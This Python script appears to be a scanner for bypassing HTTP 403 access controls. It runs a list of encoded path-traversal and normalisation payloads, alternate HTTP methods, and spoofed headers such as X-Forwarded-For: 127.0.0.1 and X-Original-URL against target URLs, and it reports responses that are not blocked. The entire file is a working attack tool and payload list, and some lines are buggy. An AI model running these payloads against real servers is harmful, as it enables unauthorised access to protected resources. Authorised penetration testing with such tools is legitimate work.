import requests
import re
import argparse

first = ["%2e/", "%252e/", "%2e%2f", "%2e%c0%af", "%252e%c0%af"]
pre_path = ["..;/", "%2e/", "%252e/", "//", "\\", "%5c", "%255c", "pupa/lupa/../../", "pupa/lupa/%2e%2e/%2e%2e/", "pupa/lupa/.%2e/.%2e/", "pupa/lupa/%2e./%2e./", "pupa\lupa\%2e%2e\%2e%2e\\", "pupa%5clupa%5c.%2e%5c%2e%5c", "pupa/lupa/%252e%252e/%252e%252e/", "pupa\lupa\%252e%252e\%252e%252e\\", "pupa/lupa/%252e.%5c.%252e%5c", "pupa/lupa/..%c0%af..%c0%af", "pupa/lupa/..%c1%9c..%c1%9c", "pupa/lupa/%252e%252e%c0%af%252e%252e%c0%af", "pupa/lupa/%252e%252e%c1%9c%252e%252e%c1%9c", "pupa/lupa/%2e%2e%c0%af%2e%2e%c1%9c","pupa%5clupa%5c%252e.%5c.%252e%5c", "pupa%c0%aflupa%c0%af..%c0%af..%c0%af", "pupa%c1%9clupa%c1%9c%252e%252e%c1%9c%252e%252e%c1%9c", "pupa%25c1%259clupa%25c1%259c%252e%252e%25c1%259c%252e%252e%25c1%259c", "pupa%25c0%25aflupa%25c0%25af..%25c0%25af..%25c0%25af", "pupa%25c0%25aflupa%25c0%25af%252e%252e%c0%af%252e%252e%c0%af", "%00/"]
past_path = ["pupa/lupa/../../", "pupa/lupa/%2e%2e/%2e%2e/", "pupa%c1%9clupa%c1%9c%2e%2e%c1%9c%2e%2e%c1%9c", "/"]
replace_slash = ["?", "??", "\\", "/\".hithere", "..;/"]
response_codes = {}
to_ignore = [400, 403, 404, 500]
full_path = ""
timeout = 10
cookie = ""

def get_args():
    global timeout
    global cookie
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", dest="target", help="Target url")
    parser.add_argument("-f", dest="targets", help="File with target urls")
    parser.add_argument("-t", dest="timeout", help="Timeout")
    parser.add_argument("-c", "--cookie", dest="cookie", help="Cookie")
    arguments = parser.parse_args()

    if not arguments.target and not arguments.targets:
        parser.error("[-] Error: null target")

    if arguments.timeout:
        timeout = arguments.timeout

    if arguments.cookie:
        cookie = arguments.cookie
    
    return arguments


def print_status_codes():
    print("Done\nResponses:")
    for code in response_codes:
        print("[{}] - {} times".format(code, response_codes[code]))

def get_last(url):
    parts = re.search('(.+)(\/.+)$', url)
    return parts.group(1), parts.group(2)

def get_main(url):
    slash = re.search('(.+\..+?\/)(.*)', url)
    return slash.group(1), slash.group(2)

def basic_tests(url, butlast, last):
    access_test(url, "post")
    access_test(url, "head")
    access_test(url, "options")
    access_test(url, "put")
    access_test(url, "patch")
    access_test(url, "get", { 'Referer': butlast })
    access_test(url, "get", { 'X-Custom-IP-Authorization': "127.0.0.1" })
    access_test(url, "get", { 'X-Originationg-IP': "127.0.0.1" })
    access_test(url, "get", { 'X-Forwarded-For': "127.0.0.1" })
    access_test(url, "get", { 'X-Remote-IP': "127.0.0.1" })
    access_test(url, "get", { 'X-Client-IP': "127.0.0.1" })
    access_test(url, "get", { 'X-Host': "127.0.0.1" })
    access_test(url, "get", { 'X-Forwarded-Host': "127.0.0.1" })
    access_test(butlast, "get", { 'X-Rewrite-URL': '/{}{}'.format(butlast, last) })    
    access_test(butlast, "get", { 'X-Original-URL': '/'.format(butlast, last) })

def through_file(fname):
    try: 
        with open(fname, 'r') as f:
            for line in f:
                directory_test(line);
    except:
        print("[-] Error: Unable to open file {}".format(fname))

def directory_test(url):
    directory = True if url[-1] is '/' else False
    response_codes = {}
    global full_path
    full_path = url
    path, last = get_last(url)
    main, rest = get_main(url)

    print("\tTesting {}".format(url))
    basic_tests(url, path, last)

    for f in first:
        access_test(url.replace(main, main + f))

    for p in past_path:
        if directory:                
            access_test(url + p)
        else:
            access_test(url + "/" + p)

    for r in replace_slash:
        if directory:
            access_test(url[:-1] + r)
        else:
            access_test(url + r)

    for pre in pre_path:
        if directory:
            npath = path + "/" + last[:-1].replace('/', pre) + "/"
        else:
            npath = path + "/" + last.replace('/', pre)
        access_test(npath)

def request(path, rtype = "get", h = {}):
    global timeout
    if len(h) == 0:
        h = ""
    if rtype == "get":
        response = requests.get(path, headers=h, timeout=timeout)
    elif rtype == "post":
        if h == "":
            h = { 'Content-Length': '0' }
        else:
            h['Content-Length'] = '0'
        response = requests.post(path, headers={ h }, timeout=timeout)
    elif rtype == "head":
        response = requests.head(path, timeout=timeout, headers=h)
    elif rtype == "options":
        response = requests.options(path, timeout=timeout, headers=h)
    elif rtype == "put":
        response = requests.put(path, timeout=timeout, headers=h)
    elif rtype == "patch":
        response = requests.patch(path, timeout=timeout, headers=h)
    else:
        return "error"
    return response

def full_path_match(url):
    if url == full_path or url[-1] == full_path or url == full_path[-1]:
        return True
    return False

def access_test(path, rtype = "get", h = {}):
    global cookie 
    if cookie != "":
        h['Cookie'] = cookie
    try:
        response = request(path, rtype, h)        
        sc = response.status_code
        if sc not in to_ignore and full_path_match(response.url):
            if h is not "":
                print("\n[{}] {} with {} request and header {}".format(response.status_code, path, rtype, h))
            else:
                print("\n[{}] {} with {} request".format(response.status_code, path, rtype))
        if response.status_code not in response_codes:
            response_codes[response.status_code] = 1
        else:
            response_codes[response.status_code] += 1
    except Exception as e:
        print(e)

def main():
    args = get_args()
    try:
        if args.target:
            directory_test(args.target)
        else:
            through_file(args.targets)
        print_status_codes()
    except KeyboardInterrupt:
        print("\nAborted\n")    

if __name__ == "__main__":
    main()
